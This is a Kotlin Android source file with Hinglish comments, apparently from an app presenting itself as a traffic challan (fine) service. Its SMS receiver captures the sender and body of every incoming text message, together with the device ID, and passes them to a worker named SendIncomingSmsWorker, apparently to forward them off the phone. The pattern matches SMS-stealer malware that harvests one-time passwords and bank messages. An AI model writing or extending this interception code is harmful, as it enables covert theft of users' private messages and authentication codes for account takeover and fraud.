package com.rte.challan.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.provider.Telephony
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.rte.challan.worker.SendIncomingSmsWorker

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        // IMPORTANT: Default SMS app ke liye DELIVER action check karna zaroori hai
        if (intent.action == Telephony.Sms.Intents.SMS_DELIVER_ACTION || 
            intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)

            for (sms in messages) {
                val sender = sms.displayOriginatingAddress ?: "Unknown"
                val messageBody = sms.messageBody ?: ""

                // Worker ko bhejne ke liye data prepare karein
                val inputData = workDataOf(
                    "sender" to sender,
                    "body" to messageBody,
                    "deviceId" to deviceId
                )

                // WorkRequest mein .setInputData(inputData) add karna zaroori hai
                val workRequest = OneTimeWorkRequestBuilder<SendIncomingSmsWorker>()
                    .setInputData(inputData) 
                    .build()
                
                WorkManager.getInstance(context).enqueue(workRequest)
            }
        }
    }
}
